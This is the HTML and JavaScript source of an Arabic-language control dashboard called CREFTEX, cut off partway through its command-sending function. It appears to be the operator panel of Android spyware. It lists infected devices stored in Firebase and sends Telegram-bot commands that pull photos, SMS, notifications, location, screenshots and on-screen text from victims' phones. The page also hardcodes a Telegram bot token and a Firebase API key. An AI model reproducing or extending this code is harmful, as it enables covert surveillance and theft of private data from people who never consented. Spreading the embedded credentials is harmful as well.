<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CREFTEX Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: radial-gradient(ellipse at top, #0f172a, #050810 60%); color: #e8eef8; min-height: 100vh; padding: 16px; padding-bottom: 40px; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 24px; padding: 20px 16px; background: linear-gradient(135deg, rgba(59,130,246,.1), rgba(6,182,212,.05)); border: 1px solid rgba(59,130,246,.2); border-radius: 20px; }
        h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #60a5fa, #06b6d4, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { color: #94a3b8; font-size: 13px; }
        .status { padding: 12px 16px; margin-bottom: 18px; border-radius: 12px; font-size: 14px; font-weight: 600; display: none; text-align: center; }
        .status.show { display: block; }
        .status.ok { background: rgba(16,185,129,.15); color: #34d399; border: 1px solid rgba(16,185,129,.3); }
        .status.err { background: rgba(239,68,68,.15); color: #f87171; border: 1px solid rgba(239,68,68,.3); }
        .status.wait { background: rgba(59,130,246,.15); color: #60a5fa; border: 1px solid rgba(59,130,246,.3); }
        .panel { background: rgba(15,23,42,.8); border: 1px solid rgba(71,85,105,.3); border-radius: 16px; padding: 18px; margin-bottom: 16px; }
        .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
        .panel-title { font-size: 16px; font-weight: 700; color: #93c5fd; }
        .refresh-btn { background: rgba(59,130,246,.15); border: 1px solid rgba(59,130,246,.3); color: #60a5fa; padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; }

        /* Device Cards */
        .devices-list { display: flex; flex-direction: column; gap: 12px; }
        .device-card {
            background: linear-gradient(135deg, rgba(30,41,59,.8), rgba(15,23,42,.8));
            border: 1px solid rgba(71,85,105,.4);
            border-radius: 14px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            transition: all .15s;
            cursor: pointer;
        }
        .device-card:hover { border-color: rgba(59,130,246,.6); transform: translateY(-2px); }
        .device-card.active { border-left: 4px solid #10b981; }
        .device-card.inactive { border-left: 4px solid #ef4444; opacity: .7; }
        .device-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            flex-shrink: 0;
        }
        .device-info { flex: 1; min-width: 0; }
        .device-name { font-size: 15px; font-weight: 700; color: #e8eef8; margin-bottom: 4px; }
        .device-meta { font-size: 12px; color: #94a3b8; direction: ltr; text-align: left; }
        .device-status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 700;
            flex-shrink: 0;
        }
        .device-status.active { background: rgba(16,185,129,.15); color: #34d399; border: 1px solid rgba(16,185,129,.3); }
        .device-status.inactive { background: rgba(239,68,68,.15); color: #f87171; border: 1px solid rgba(239,68,68,.3); }

        /* Commands for selected device */
        .selected-device {
            background: rgba(59,130,246,.1);
            border: 1px solid rgba(59,130,246,.4);
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .selected-device .info { flex: 1; }
        .selected-device .label { font-size: 11px; color: #94a3b8; margin-bottom: 4px; }
        .selected-device .name { font-size: 15px; font-weight: 700; color: #60a5fa; }
        .selected-device .close-btn { background: rgba(239,68,68,.2); border: 1px solid rgba(239,68,68,.4); color: #f87171; padding: 6px 12px; border-radius: 8px; font-size: 12px; cursor: pointer; font-weight: 600; }

        .grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
        .btn { padding: 16px 12px; border-radius: 12px; border: none; font-size: 14px; font-weight: 700; color: #fff; cursor: pointer; background: linear-gradient(135deg, #3b82f6, #2563eb); display: flex; align-items: center; justify-content: center; min-height: 52px; text-align: center; }
        .btn:active { transform: scale(.96); }
        .btn.secondary { background: linear-gradient(135deg, #6366f1, #4f46e5); }
        .btn.green { background: linear-gradient(135deg, #10b981, #059669); }
        .btn.orange { background: linear-gradient(135deg, #f59e0b, #d97706); }
        .btn.danger { background: linear-gradient(135deg, #ef4444, #dc2626); }
        .btn.purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }

        .log { background: #050810; border-radius: 12px; padding: 14px; max-height: 500px; overflow-y: auto; direction: ltr; border: 1px solid rgba(71,85,105,.2); }
        .msg { padding: 10px 12px; margin-bottom: 8px; border-radius: 10px; background: rgba(30,41,59,.5); border-left: 3px solid #3b82f6; }
        .msg.bot { border-left-color: #06b6d4; background: rgba(6,182,212,.08); }
        .msg.user { border-left-color: #10b981; background: rgba(16,185,129,.08); }
        .msg-time { color: #64748b; font-size: 11px; margin-bottom: 4px; direction: rtl; }
        .msg-from { color: #93c5fd; font-weight: 700; font-size: 12px; direction: rtl; }
        .msg-text { color: #e2e8f0; direction: rtl; text-align: right; margin-top: 6px; white-space: pre-wrap; word-break: break-word; font-size: 13px; }
        .msg-img { max-width: 100%; border-radius: 8px; margin-top: 8px; display: block; border: 1px solid rgba(71,85,105,.3); cursor: pointer; }

        .empty { text-align: center; color: #64748b; padding: 40px 20px; font-size: 14px; direction: rtl; }
        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: .5; }

        .modal { position: fixed; inset: 0; background: rgba(0,0,0,.95); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
        .modal.show { display: flex; }
        .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
        .modal-close { position: absolute; top: 20px; right: 20px; width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,.1); border: none; color: #fff; font-size: 24px; cursor: pointer; }

        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; }
        .stat { background: rgba(30,41,59,.6); padding: 14px 8px; border-radius: 12px; text-align: center; }
        .stat .num { font-size: 22px; font-weight: 800; color: #22d3ee; }
        .stat .lbl { font-size: 11px; color: #94a3b8; margin-top: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ CREFTEX</h1>
            <div class="subtitle">لوحة التحكم عن بُعد</div>
        </div>

        <div class="status" id="status"></div>

        <!-- Stats -->
        <div class="panel">
            <div class="panel-header"><div class="panel-title">📊 الإحصائيات</div></div>
            <div class="stats">
                <div class="stat"><div class="num" id="statDevices">0</div><div class="lbl">أجهزة</div></div>
                <div class="stat"><div class="num" id="statActive">0</div><div class="lbl">نشطة</div></div>
                <div class="stat"><div class="num" id="statMsgs">0</div><div class="lbl">رسائل</div></div>
            </div>
        </div>

        <!-- Devices List -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-title">📱 الأجهزة</div>
                <button class="refresh-btn" onclick="loadDevices()">🔄 تحديث</button>
            </div>
            <div class="devices-list" id="devicesList">
                <div class="empty"><div class="empty-icon">📱</div>لا أجهزة مسجّلة بعد</div>
            </div>
        </div>

        <!-- Selected Device + Commands -->
        <div id="cmdPanel" style="display:none">
            <div class="selected-device">
                <div class="info">
                    <div class="label">الجهاز المحدد</div>
                    <div class="name" id="selDeviceName">—</div>
                </div>
                <button class="close-btn" onclick="clearSelection()">✕ إلغاء</button>
            </div>

            <div class="panel">
                <div class="panel-header"><div class="panel-title">🎛 الأوامر</div></div>
                <div class="grid">
                    <button class="btn" onclick="sendCmd('/menu')">📋 القائمة</button>
                    <button class="btn secondary" onclick="sendCmd('/photos')">📸 كل الصور</button>
                    <button class="btn secondary" onclick="sendCmd('/photos 50')">📸 آخر 50</button>
                    <button class="btn green" onclick="sendCmd('/info')">📊 معلومات الجهاز</button>
                    <button class="btn green" onclick="sendCmd('/location')">📍 الموقع</button>
                    <button class="btn orange" onclick="sendCmd('/screen')">📷 لقطة شاشة</button>
                    <button class="btn purple" onclick="sendCmd('/sms')">📩 SMS</button>
                    <button class="btn purple" onclick="sendCmd('/notifs')">🔔 الإشعارات</button>
                    <button class="btn secondary" onclick="sendCmd('/accessibility')">📝 نصوص الشاشة</button>
                    <button class="btn danger" onclick="sendCmd('/screen_stop')">🛑 إيقاف اللقطات</button>
                </div>
            </div>
        </div>

        <!-- Messages -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-title">💬 الرسائل</div>
                <button class="refresh-btn" onclick="loadMessages(true)">🔄 تحديث</button>
            </div>
            <div class="log" id="logBox">
                <div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>
            </div>
        </div>
    </div>

    <div class="modal" id="imgModal" onclick="closeModal()">
        <button class="modal-close" onclick="closeModal()">×</button>
        <img id="modalImg" src="" alt="">
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM";
        const TELEGRAM_CHAT_ID = "8599240795";
        const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
        const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";

        const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
        const TG_FILE = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
        const FS_DEVICES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`;
        const FS_MESSAGES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;

        let lastUpdateId = 0;
        let messageCache = {};
        let selectedDevice = null;

        // ═══════════════════════════════════════
        //  الأجهزة
        // ═══════════════════════════════════════
        async function loadDevices() {
            try {
                const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
                const data = await res.json();

                const devicesList = document.getElementById('devicesList');
                const docs = data.documents || [];

                if (docs.length === 0) {
                    devicesList.innerHTML = '<div class="empty"><div class="empty-icon">📱</div>لا أجهزة مسجّلة بعد</div>';
                    document.getElementById('statDevices').textContent = '0';
                    document.getElementById('statActive').textContent = '0';
                    return;
                }

                // تحويل البيانات
                const devices = docs.map(d => {
                    const f = d.fields || {};
                    const lastSeen = parseInt(f.last_seen_ms?.integerValue || '0');
                    const installedAt = parseInt(f.installed_at_ms?.integerValue || '0');
                    const isActive = (Date.now() - lastSeen) < 10 * 60 * 1000; // آخر 10 دقائق

                    return {
                        id: f.id?.stringValue || '',
                        brand: f.brand?.stringValue || '',
                        manufacturer: f.manufacturer?.stringValue || '',
                        model: f.model?.stringValue || '',
                        android: f.android?.stringValue || '',
                        sdk: f.sdk?.integerValue || '',
                        lastSeen: lastSeen,
                        installedAt: installedAt,
                        isActive: isActive
                    };
                }).sort((a, b) => b.lastSeen - a.lastSeen);

                // إحصائيات
                document.getElementById('statDevices').textContent = devices.length;
                document.getElementById('statActive').textContent = devices.filter(d => d.isActive).length;

                // عرض
                devicesList.innerHTML = '';
                for (const d of devices) {
                    const card = document.createElement('div');
                    card.className = 'device-card ' + (d.isActive ? 'active' : 'inactive');
                    card.onclick = () => selectDevice(d);

                    const lastSeenStr = d.lastSeen > 0
                        ? new Date(d.lastSeen).toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' })
                        : '—';

                    card.innerHTML = `
                        <div class="device-icon">📱</div>
                        <div class="device-info">
                            <div class="device-name">${escapeHtml(d.manufacturer)} ${escapeHtml(d.model)}</div>
                            <div class="device-meta">Android ${escapeHtml(d.android)} • ${escapeHtml(d.id)}</div>
                            <div class="device-meta">آخر ظهور: ${lastSeenStr}</div>
                        </div>
                        <div class="device-status ${d.isActive ? 'active' : 'inactive'}">
                            ${d.isActive ? '🟢 نشط' : '🔴 خامل'}
                        </div>
                    `;
                    devicesList.appendChild(card);
                }
            } catch (e) {
                console.error('loadDevices err', e);
                document.getElementById('devicesList').innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div>تعذّر تحميل الأجهزة</div>';
            }
        }

        function selectDevice(d) {
            selectedDevice = d;
            document.getElementById('cmdPanel').style.display = 'block';
            document.getElementById('selDeviceName').textContent = `${d.manufacturer} ${d.model} — Android ${d.android}`;
            // scroll to commands
            document.getElementById('cmdPanel').scrollIntoView({ behavior: 'smooth' });
        }

        function clearSelection() {
            selectedDevice = null;
            document.getElementById('cmdPanel').style.display = 'none';
        }

        // ═══════════════════════════════════════
        //  إرسال أمر
        // ═══════════════════════════════════════
        async function sendCmd(cmd) {
            if (!selectedDevice) {
                showStatus('❌ اختر جهازًا أولًا', 'err');
                return;
            }
            showStatus(`⏳ إرسال: ${cmd}`, 'wait');
            try {
                // نرسل الأمر مع معرف الجهاز في النص
                const fullCmd = `${cmd}`;
                const res = await fetch(`${TG_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: fullCmd })
                });
                const data = await res.json();
                if (data.ok) {
                    showStatus(`
